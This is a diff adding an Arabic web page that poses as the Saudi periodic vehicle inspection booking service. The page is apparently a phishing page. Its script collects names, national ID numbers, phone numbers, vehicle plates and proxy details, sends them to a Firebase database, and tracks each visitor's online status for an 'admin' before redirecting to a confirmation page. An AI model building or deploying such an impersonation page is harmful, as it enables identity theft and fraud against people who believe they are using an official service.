@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>مركز سلامة المركبات - خدمة الفحص الفني الدوري</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        :root {
+            --primary-green: #1a6d44;
+            --secondary-green: #2d8a5a;
+            --active-green: #2fb16e;
+            --light-bg: #fdfdfd;
+            --border-color: #e0e0e0;
+            --text-dark: #333;
+            --error-red: #d32f2f;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--light-bg);
+            margin: 0; padding: 0; overflow-x: hidden; color: var(--text-dark);
+        }
+
+        header { width: 100%; margin: 0; padding: 0; }
+        header img { width: 100%; display: block; }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; box-sizing: border-box; }
+        .page-title { color: var(--primary-green); font-size: 24px; font-weight: bold; text-align: center; margin-bottom: 5px; }
+        .sub-title { color: var(--secondary-green); font-size: 20px; text-align: center; margin-bottom: 25px; }
+
+        .section-header { font-size: 18px; font-weight: bold; margin: 25px 0 15px; color: #1a3a34; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .field-label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
+        .field-label span { color: var(--error-red); }
+
+        .form-group { margin-bottom: 20px; }
+
+        input[type="text"], input[type="email"], input[type="date"], select {
+            width: 100%; padding: 12px; border: 1px solid var(--border-color);
+            border-radius: 8px; box-sizing: border-box; background-color: #fff;
+            font-size: 14px; color: #666; text-align: right; outline: none;
+        }
+
+        .phone-input-container { display: flex; border: 1px solid var(--border-color); border-radius: 8px; background: #fff; overflow: hidden; }
+        .country-code { display: flex; align-items: center; padding: 0 10px; background: #f9f9f9; border-left: 1px solid var(--border-color); }
+        .flag-icon { width: 24px; }
+        .phone-input-container input { border: none; flex: 1; outline: none; padding: 12px; text-align: right; }
+
+        .proxy-checkbox-group { display: flex; align-items: center; gap: 10px; margin: 25px 0; }
+        .proxy-checkbox-group input[type="checkbox"] { width: 22px; height: 22px; accent-color: var(--primary-green); cursor: pointer; }
+
+        .proxy-container {
+            display: none; background-color: #fff; border: 1px solid #edf0f2; border-radius: 12px;
+            padding: 20px; margin-top: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.02);
+        }
+        
+        .toggle-switch-box { display: flex; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; margin-bottom: 20px; }
+        .switch-btn { flex: 1; padding: 12px; border: none; background: #fff; cursor: pointer; color: #666; font-size: 14px; transition: 0.3s; }
+        .switch-btn.active { background: var(--primary-green); color: #fff; }
+
+        .status-options-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; width: 100%; }
+        .status-option-btn {
+            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #dce0e4;
+            background: #f8f9fb; color: #555; font-size: 16px; text-align: center;
+            cursor: pointer; transition: all 0.3s ease; box-sizing: border-box;
+        }
+        .status-option-btn.active {
+            border: 2px solid var(--active-green); background: #fff; color: #1a1a1a;
+            box-shadow: 0 4px 12px rgba(47, 177, 110, 0.15); font-weight: bold;
+        }
+
+        .plate-wrapper {
+            background: #fff; border: 3px solid #333; border-radius: 8px;
+            width: 100%; max-width: 320px; height: 110px; margin: 20px auto;
+            display: flex; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.15); overflow: hidden;
+        }
+        .plate-side-info { width: 45px; border-left: 2px solid #333; display: flex; flex-direction: column; align-items: center; justify-content: space-around; background: #fcfcfc; padding: 5px 0; }
+        .plate-side-info img { width: 22px; }
+        .plate-side-info span { font-size: 10px; font-weight: bold; color: #333; }
+        .plate-main-content { flex: 1; display: flex; flex-direction: column; }
+        .plate-row-top, .plate-row-bottom { flex: 1; display: flex; align-items: center; justify-content: center; }
+        .plate-row-top { border-bottom: 1px solid #333; background: #fff; }
+        .plate-row-bottom { background: #f9f9f9; }
+        .plate-part { flex: 1; text-align: center; font-size: 24px; font-weight: 900; color: #111; letter-spacing: 2px; }
+        .plate-divider { width: 2px; height: 100%; background: #333; }
+        .plate-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 10px; }
+
+        #map { height: 250px; width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid var(--border-color); }
+
+        .warning-box { background-color: #fff5f5; border-radius: 8px; padding: 15px; display: flex; margin: 20px 0; border: 1px solid #ffebeb; }
+        .warning-text { color: var(--error-red); font-size: 13px; line-height: 1.6; flex: 1; }
+        .warning-icon { color: var(--error-red); margin-left: 10px; font-size: 20px; }
+
+        .next-btn { width: 100%; padding: 15px; background: var(--primary-green); color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 40px; transition: 0.3s; }
+        .next-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+        footer { width: 100%; display: flex; flex-direction: column; margin: 0; padding: 0; }
+        footer img { width: 100%; display: block; }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg" alt="Header">
+</header>
+
+<div class="container">
+    <h2 class="page-title">خدمة الفحص الفني الدوري</h2>
+    <h3 class="sub-title">صفحة التسجيل</h3>
+
+    <div class="section-header">المعلومات الشخصية</div>
+    <div class="form-group"><label class="field-label">الإسم<span>*</span></label><input type="text" id="full_name" placeholder="إدخل الإسم"></div>
+    <div class="form-group"><label class="field-label">رقم الهوية / الإقامة<span>*</span></label><input type="text" id="id_number" placeholder="رقم الهوية / الإقامة"></div>
+    
+    <div class="form-group">
+        <label class="field-label">الجنسية<span>*</span></label>
+        <select id="nationality">
+            <option value="">اختر الجنسية</option>
+            <option>السعودية</option><option>الإمارات</option><option>البحرين</option><option>الكويت</option><option>عمان</option><option>قطر</option><option>مصر</option><option>الأردن</option><option>سوريا</option><option>العراق</option><option>لبنان</option><option>اليمن</option><option>السودان</option><option>فلسطين</option><option>تونس</option><option>المغرب</option><option>الجزائر</option><option>ليبيا</option><option>الهند</option><option>باكستان</option><option>بنغلاديش</option><option>الفلبين</option><option>إندونيسيا</option><option>أخرى</option>
+        </select>
+    </div>
+
+    <div class="form-group">
+        <label class="field-label">رقم الجوال<span>*</span></label>
+        <div class="phone-input-container">
+            <input type="text" id="phone" placeholder="أكتب رقم الجوال هنا...">
+            <div class="country-code"><img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Flag_of_Saudi_Arabia.svg" class="flag-icon"></div>
+        </div>
+    </div>
+    <div class="form-group"><label class="field-label">البريد الإلكتروني</label><input type="email" id="email" placeholder="البريد الإلكتروني"></div>
+
+    <div class="proxy-checkbox-group">
+        <input type="checkbox" id="toggleProxy" onchange="handleProxy()">
+        <label for="toggleProxy" class="field-label">هل تريد تفويض شخص آخر بفحص المركبة؟<span>*</span></label>
+    </div>
+
+    <div id="proxySection" class="proxy-container">
+        <div style="text-align: center; font-weight: bold; margin-bottom: 15px; color: #1a3a34;">المعلومات المفوض</div>
+        <div class="toggle-switch-box">
+            <button type="button" id="btnCitizen" class="switch-btn active" onclick="setProxyStatus('citizen')">مواطن / مقيم</button>
+            <button type="button" id="btnGulf" class="switch-btn" onclick="setProxyStatus('gulf')">مواطن خليجي</button>
+        </div>
+        <div class="form-group"><label class="field-label">أسم المفوض</label><input type="text" id="proxy_name" placeholder="أكتب اسم المفوض هنا..."></div>
+        <div class="form-group">
+            <label class="field-label">رقم الجوال</label>
+            <div class="phone-input-container">
+                <input type="text" id="proxy_phone" placeholder="أكتب رقم الجوال المفوض هنا...">
+                <div class="country-code"><img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Flag_of_Saudi_Arabia.svg" class="flag-icon"></div>
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="field-label">جنسية المفوض</label>
+            <select id="proxy_nation">
+                <option value="">اختر الجنسية</option>
+                <option>السعودية</option><option>الإمارات</option><option>البحرين</option><option>الكويت</option><option>عمان</option><option>قطر</option><option>مصر</option><option>أخرى</option>
+            </select>
+        </div>
+        <div class="form-group"><label class="field-label">رقم الهوية الوطنية / الاقامة المفوض</label><input type="text" id="proxy_id" placeholder="أكتب رقم الهوية الوطنية / الاقامة المفوض هنا.."></div>
+        <div class="form-group"><label class="field-label">تاريخ ميلاد المفوض</label><input type="text" id="proxy_dob" placeholder="يوم / شهر / سنة"></div>
+        <div style="display: flex; gap: 10px; align-items: flex-start; margin-top: 10px;">
+            <input type="checkbox" id="proxy_agree">
+            <p style="font-size: 13px; margin: 0; color: #1a3a34;">أوافق على أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني الدوري للمركبة المفوض عنها</p>
+        </div>
+    </div>
+
+    <div class="section-header">معلومات المركبة</div>
+    <div class="form-group">
+        <label class="field-label">اختر حالة المركبة<span>*</span></label>
+        <div class="status-options-list">
+            <div id="btnLicense" class="status-option-btn active" onclick="switchVehicleStatus('license')">تحمل رخصة سير</div>
+            <div id="btnCustoms" class="status-option-btn" onclick="switchVehicleStatus('customs')">تحمل بطاقة جمركية</div>
+        </div>
+    </div>
+
+    <div id="licenseSection">
+        <div class="form-group">
+            <label class="field-label">بلد التسجيل<span>*</span></label>
+            <select id="reg_country">
+                <option value="">اختر بلد التسجيل</option>
+                <option>السعودية</option><option>الإمارات</option><option>مصر</option><option>الأردن</option><option>سوريا</option><option>عمان</option><option>الكويت</option><option>العراق</option><option>البحرين</option><option>قطر</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label class="field-label">رقم اللوحة<span>*</span></label>
+            <div class="plate-grid">
+                <select id="char1" onchange="updatePlate()"><option value="">اختر</option><option value="أ|A">أ-A</option><option value="ب|B">ب-B</option><option value="ح|J">ح-J</option><option value="د|D">د-D</option><option value="ر|R">ر-R</option><option value="س|S">س-S</option><option value="ص|X">ص-X</option><option value="ط|T">ط-T</option><option value="ع|E">ع-E</option><option value="ق|G">ق-G</option><option value="ك|K">ك-K</option><option value="ل|L">ل-L</option><option value="م|Z">م-Z</option><option value="ن|N">ن-N</option><option value="هـ|H">هـ-H</option><option value="و|U">و-U</option><option value="ى|V">ى-V</option></select>
+                <select id="char2" onchange="updatePlate()"><option value="">اختر</option><option value="أ|A">أ-A</option><option value="ب|B">ب-B</option><option value="ح|J">ح-J</option><option value="د|D">د-D</option><option value="ر|R">ر-R</option><option value="س|S">س-S</option><option value="ص|X">ص-X</option><option value="ط|T">ط-T</option><option value="ع|E">ع-E</option><option value="ق|G">ق-G</option><option value="ك|K">ك-K</option><option value="ل|L">ل-L</option><option value="م|Z">م-Z</option><option value="ن|N">ن-N</option><option value="هـ|H">هـ-H</option><option value="و|U">و-U</option><option value="ى|V">ى-V</option></select>
+                <select id="char3" onchange="updatePlate()"><option value="">اختر</option><option value="أ|A">أ-A</option><option value="ب|B">ب-B</option><option value="ح|J">ح-J</option><option value="د|D">د-D</option><option value="ر|R">ر-R</option><option value="س|S">س-S</option><option value="ص|X">ص-X</option><option value="ط|T">ط-T</option><option value="ع|E">ع-E</option><option value="ق|G">ق-G</option><option value="ك|K">ك-K</option><option value="ل|L">ل-L</option><option value="م|Z">م-Z</option><option value="ن|N">ن-N</option><option value="هـ|H">هـ-H</option><option value="و|U">و-U</option><option value="ى|V">ى-V</option></select>
+            </div>
+            <input type="text" id="plateNumInput" onkeyup="updatePlate()" placeholder="أدخل الأرقام">
+        </div>
+        <div class="plate-wrapper">
+            <div class="plate-main-content">
+                <div class="plate-row-top"><div id="dispChars" class="plate-part">- - -</div><div class="plate-divider"></div><div id="dispNums" class="plate-part">- - - -</div></div>
+                <div class="plate-row-bottom"><div id="dispCharsEn" class="plate-part" style="font-family: Arial;">- - -</div><div class="plate-divider"></div><div id="dispNumsEn" class="plate-part" style="font-family: Arial;">- - - -</div></div>
+            </div>
+            <div class="plate-side-info"><img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Flag_of_Saudi_Arabia.svg"><span>KSA</span></div>
+        </div>
+    </div>
+
+    <div id="customsSection" class="hidden"><div class="form-group"><label class="field-label">رقم البطاقة الجمركية<span>*</span></label><input type="text" id="customs_id" placeholder="أدخل رقم البطاقة الجمركية"></div></div>
+
+    <div class="form-group">
+        <label class="field-label">نوع التسجيل<span>*</span></label>
+        <select id="reg_type">
+            <option value="">اختر نوع التسجيل</option>
+            <option>خصوصي</option><option>نقل عام</option><option>نقل خاص</option><option>مقطورة</option><option>دراجة نارية</option><option>مركبة أجرة</option><option>تصدير</option><option>دراجة نارية ترفيهية</option><option>هيئة دبلوماسية</option><option>حافلة خاصة</option><option>مؤقتة</option><option>مركبة أشغال عامة</option>
+        </select>
+    </div>
+
+    <div class="section-header">مركز الخدمة</div>
+    <div class="form-group">
+        <label class="field-label">نوع المركبة<span>*</span></label>
+        <select id="v_type">
+            <option value="">اختر نوع المركبة</option>
+            <option>سيارة خاصة</option><option>مركبة نقل خفيفة خاصة</option><option>نقل ثقيل</option><option>حافلة خفيفة</option><option>مركبة نقل خفيفة</option><option>نقل متوسط</option><option>حافلة كبيرة</option><option>الدراجات ثنائية العجلات</option><option>مركبات أشغال عامة</option><option>دراجة ثلاثية أو رباعية العجلات</option><option>مقطورة ثقيلة</option><option>سيارات الأجرة</option><option>سيارات التأجير</option><option>نصف مقطورة ثقيلة</option><option>حافلة متوسطة</option><option>مقطورة خفيفة</option><option>نصف مقطورة خفيفة</option><option>نصف مقطورة خفيفة خاصة</option><option>مقطورة خفيفة خاصة</option>
+        </select>
+    </div>
+    
+    <div class="form-group">
+        <label class="field-label">نوع خدمة الفحص<span>*</span></label>
+        <select id="s_type">
+            <option value="">اختر</option>
+            <option value="خدمة الفحص الدوري">خدمة الفحص الدوري</option>
+            <option value="خدمة إعادة الفحص الدوري">خدمة إعادة الفحص الدوري</option>
+        </select>
+    </div>
+
+    <div class="form-group">
+        <label class="field-label">المنطقة الإدارية للفحص<span>*</span></label>
+        <select id="region_select" onchange="updateCenters()">
+            <option value="">اختر المنطقة</option>
+            <option value="الرياض">منطقة الرياض</option>
+            <option value="مكة">منطقة مكة المكرمة</option>
+            <option value="الشرقية">المنطقة الشرقية</option>
+            <option value="القصيم">منطقة القصيم</option>
+            <option value="المدينة">منطقة المدينة المنورة</option>
+            <option value="عسير">منطقة عسير</option>
+            <option value="تبوك">منطقة تبوك</option>
+            <option value="حائل">منطقة حائل</option>
+            <option value="الشمالية">منطقة الحدود الشمالية</option>
+            <option value="جازان">منطقة جازان</option>
+            <option value="نجران">منطقة نجران</option>
+            <option value="الباحة">منطقة الباحة</option>
+            <option value="الجوف">منطقة الجوف</option>
+        </select>
+    </div>
+
+    <div class="form-group">
+        <label class="field-label">مركز الفحص<span>*</span></label>
+        <select id="center_select">
+            <option value="">اختر المركز أولاً</option>
+        </select>
+    </div>
+
+    <div id="map"></div>
+
+    <div class="section-header">موعد الخدمة</div>
+    
+    <div class="form-group">
+        <label class="field-label">تاريخ الفحص<span>*</span></label>
+        <input type="date" id="f_date" name="f_date" min="2026-03-22">
+    </div>
+
+    <div class="form-group">
+        <label class="field-label">وقت الفحص<span>*</span></label>
+        <select id="f_time">
+            <option value="">اختر الوقت</option>
+            <option>8:00 صباحاً</option><option>8:05 صباحاً</option><option>8:10 صباحاً</option><option>8:15 صباحاً</option><option>8:20 صباحاً</option><option>8:25 صباحاً</option><option>8:30 صباحاً</option><option>8:35 صباحاً</option><option>8:40 صباحاً</option><option>8:45 صباحاً</option><option>8:50 صباحاً</option><option>8:55 صباحاً</option>
+            <option>9:00 صباحاً</option><option>9:05 صباحاً</option><option>9:10 صباحاً</option><option>9:15 صباحاً</option><option>9:20 صباحاً</option><option>9:25 صباحاً</option><option>9:30 صباحاً</option><option>9:35 صباحاً</option><option>9:40 صباحاً</option><option>9:45 صباحاً</option><option>9:50 صباحاً</option><option>9:55 صباحاً</option>
+            <option>10:00 صباحاً</option><option>10:05 صباحاً</option><option>10:10 صباحاً</option><option>10:15 صباحاً</option><option>10:20 صباحاً</option><option>10:25 صباحاً</option><option>10:30 صباحاً</option><option>10:35 صباحاً</option><option>10:40 صباحاً</option><option>10:45 صباحاً</option><option>10:50 صباحاً</option><option>10:55 صباحاً</option>
+            <option>11:00 صباحاً</option><option>11:05 صباحاً</option><option>11:10 صباحاً</option><option>11:15 صباحاً</option><option>11:20 صباحاً</option><option>11:25 صباحاً</option><option>11:30 صباحاً</option><option>11:35 صباحاً</option><option>11:40 صباحاً</option><option>11:45 صباحاً</option><option>11:50 صباحاً</option><option>11:55 صباحاً</option>
+            <option>12:00 مساءً</option><option>12:05 مساءً</option><option>12:10 مساءً</option><option>12:15 مساءً</option><option>12:20 مساءً</option><option>12:25 مساءً</option><option>12:30 مساءً</option><option>12:35 مساءً</option><option>12:40 مساءً</option><option>12:45 مساءً</option><option>12:50 مساءً</option><option>12:55 مساءً</option>
+            <option>1:00 مساءً</option><option>1:05 مساءً</option><option>1:10 مساءً</option><option>1:15 مساءً</option><option>1:20 مساءً</option><option>1:25 مساءً</option><option>1:30 مساءً</option><option>1:35 مساءً</option><option>1:40 مساءً</option><option>1:45 مساءً</option><option>1:50 مساءً</option><option>1:55 مساءً</option>
+            <option>2:00 مساءً</option><option>2:05 مساءً</option><option>2:10 مساءً</option><option>2:15 مساءً</option><option>2:20 مساءً</option><option>2:25 مساءً</option><option>2:30 مساءً</option><option>2:35 مساءً</option><option>2:40 مساءً</option><option>2:45 مساءً</option><option>2:50 مساءً</option><option>2:55 مساءً</option>
+            <option>3:00 مساءً</option><option>3:05 مساءً</option><option>3:10 مساءً</option><option>3:15 مساءً</option><option>3:20 مساءً</option><option>3:25 مساءً</option><option>3:30 مساءً</option><option>3:35 مساءً</option><option>3:40 مساءً</option><option>3:45 مساءً</option><option>3:50 مساءً</option><option>3:55 مساءً</option>
+        </select>
+    </div>
+
+    <div class="warning-box">
+        <div class="warning-text">الحضور على الموعد يسهم في سرعة وجودة الخدمة وفي حالة عدم الحضور، لن يسمح بحجز آخر إلا بعد 48 ساعة وحسب الأوقات المحددة</div>
+        <div class="warning-icon">⚠️</div>
+    </div>
+
+    <button type="button" id="submitBtn" class="next-btn" onclick="sendDataAndRedirect()">التالي</button>
+</div>
+
+<footer>
+    <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" alt="Footer Top">
+    <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" alt="Footer Bottom">
+</footer>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
+      authDomain: "saso-inspection.firebaseapp.com",
+      databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
+      projectId: "saso-inspection",
+      storageBucket: "saso-inspection.appspot.com",
+      messagingSenderId: "1009002235896",
+      appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let visitorId = localStorage.getItem('visitorId');
+    if (!visitorId) {
+        visitorId = 'user_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('visitorId', visitorId);
+    }
+
+    const userRef = db.ref('visitors/' + visitorId);
+    userRef.update({
+        lastActive: firebase.database.ServerValue.TIMESTAMP,
+        currentPage: "صفحة الحجز (Booking)",
+        status: "online"
+    });
+
+    userRef.onDisconnect().update({
+        status: "offline",
+        lastSeen: firebase.database.ServerValue.TIMESTAMP
+    });
+
+    const centersData = {
+        "الرياض": ["الرياض حي المونسية", "الرياض حي القيروان", "المجمعة", "المسار الامن الرياض حي القادسية", "جنوب شرق الرياض مخرج 17", "الرياض حي الشفا طريق ديراب", "الخرج", "شقراء", "مركز الفحص الفني الدوري في المزاحمية", "المسار الامن مركز محافظة الافلاج", "القويعية", "الرياض جامعة الملك سعود", "الزلفي", "الرياض حي المنار", "واجهة روشن", "أبراج التاج عفيف", "وادي الدواسر"],
+        "مكة": ["الخرمة", "القنفذة", "جدة الشمال", "مكة المكرمة", "جدة عسفان", "جدة الجنوب", "الطائف", "الطائف حي النسيم"],
+        "الشرقية": ["الدمام", "أبراج التاج الدمام", "الخفجي", "الخبر صناعية الثقبة", "الهفوف", "آيبلس شرق الاحساء", "حفر الباطن", "شرق حفر الباطن", "الجبيل"],
+        "القصيم": ["الرس", "المذنب", "النبهانية", "القصيم"],
+        "المدينة": ["المدينة المنورة شرق حي العاقول", "ينبع", "المدينة المنورة"],
+        "عسير": ["ابها", "الفحص الفني الدوري سراة عبيدة", "محايل عسير", "بيشة"],
+        "تبوك": ["تبـــوك", "الفحص الفني الدوري ضباء"],
+        "حائل": ["حائل", "ٲبراج التاج محطة بقعاء", "حائل المنطقة الصناعية الثانية"],
+        "الشمالية": ["رفحاء", "عرعر"],
+        "جازان": ["جيزان", "آيبلس جازان", "المسار الامن مركز صناعية صامطة", "بيش"],
+        "نجران": ["نجران"],
+        "الباحة": ["الباحة"],
+        "الجوف": ["الجوف", "القريات"]
+    };
+
+    function updateCenters() {
+        const region = document.getElementById('region_select').value;
+        const centerSelect = document.getElementById('center_select');
+        centerSelect.innerHTML = '<option value="">اختر المركز</option>';
+        if (region && centersData[region]) {
+            centersData[region].forEach(c => {
+                const opt = document.createElement('option');
+                opt.value = c; opt.textContent = c;
+                centerSelect.appendChild(opt);
+            });
+        }
+    }
+
+    function handleProxy() {
+        document.getElementById('proxySection').style.display = document.getElementById('toggleProxy').checked ? "block" : "none";
+    }
+
+    function setProxyStatus(type) {
+        document.getElementById('btnCitizen').classList.toggle('active', type === 'citizen');
+        document.getElementById('btnGulf').classList.toggle('active', type === 'gulf');
+    }
+
+    let currentVehicleStatus = 'license';
+    function switchVehicleStatus(status) {
+        currentVehicleStatus = status;
+        document.getElementById('btnLicense').classList.toggle('active', status === 'license');
+        document.getElementById('btnCustoms').classList.toggle('active', status === 'customs');
+        document.getElementById('licenseSection').classList.toggle('hidden', status !== 'license');
+        document.getElementById('customsSection').classList.toggle('hidden', status !== 'customs');
+    }
+
+    function updatePlate() {
+        const c1 = document.getElementById('char1').value.split('|');
+        const c2 = document.getElementById('char2').value.split('|');
+        const c3 = document.getElementById('char3').value.split('|');
+        const num = document.getElementById('plateNumInput').value;
+        document.getElementById('dispChars').innerText = (c3[0] || "-") + " " + (c2[0] || "-") + " " + (c1[0] || "-");
+        document.getElementById('dispCharsEn').innerText = (c1[1] || "-") + " " + (c2[1] || "-") + " " + (c3[1] || "-");
+        document.getElementById('dispNums').innerText = num || "- - - -";
+        document.getElementById('dispNumsEn').innerText = num || "- - - -";
+    }
+
+    function sendDataAndRedirect() {
+        const fullName = document.getElementById('full_name').value.trim();
+        const idNumber = document.getElementById('id_number').value.trim();
+        const nationality = document.getElementById('nationality').value;
+        const phone = document.getElementById('phone').value.trim();
+        const region = document.getElementById('region_select').value;
+        const center = document.getElementById('center_select').value;
+        const fDate = document.getElementById('f_date').value;
+        const fTime = document.getElementById('f_time').value;
+
+        if (!fullName || !idNumber || !nationality || !phone || !region || !center || !fDate || !fTime) {
+            alert("يرجى ملء جميع الحقول المطلوبة (المؤشر عليها بـ *) قبل الانتقال.");
+            return;
+        }
+
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = "جاري الحفظ...";
+
+        let finalPlate = "";
+        if(currentVehicleStatus === 'license') {
+            const c1 = document.getElementById('char1').value.split('|')[0] || "";
+            const c2 = document.getElementById('char2').value.split('|')[0] || "";
+            const c3 = document.getElementById('char3').value.split('|')[0] || "";
+            const num = document.getElementById('plateNumInput').value;
+            finalPlate = `${num} ${c1} ${c2} ${c3}`;
+        } else {
+            finalPlate = document.getElementById('customs_id').value;
+        }
+
+        // تم توحيد المسميات هنا لضمان وصولها للأدمن والفاتورة (fullName, vehicleType, plateNumber)
+        const formData = {
+            fullName: fullName,
+            full_name: fullName,
+            idNumber: idNumber,
+            nationality: nationality,
+            phone: phone,
+            email: document.getElementById('email').value,
+            region: region,
+            center: center,
+            bookingDate: fDate,
+            appointment_date: fDate,
+            bookingTime: fTime,
+            appointment_time: fTime,
+            vehicleStatus: currentVehicleStatus,
+            plateNumber: finalPlate,
+            plate_number: finalPlate,
+            vehicleType: document.getElementById('v_type').value,
+            vehicle_type: document.getElementById('v_type').value,
+            regType: document.getElementById('reg_type').value,
+            sType: document.getElementById('s_type').value,
+            lastUpdate: new Date().toLocaleString('ar-SA'),
+            status: "online"
+        };
+
+        userRef.update(formData).then(() => {
+            db.ref('orders').push({ ...formData, visitorId: visitorId }).then(() => {
+                window.location.href = "confirm.html";
+            });
+        }).catch(err => {
+            alert("حدث خطأ: " + err.message);
+            btn.disabled = false;
+            btn.innerText = "التالي";
+        });
+    }
+
+    var map = L.map('map').setView([24.7136, 46.6753], 6);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+</script>
+</body>
+</html>
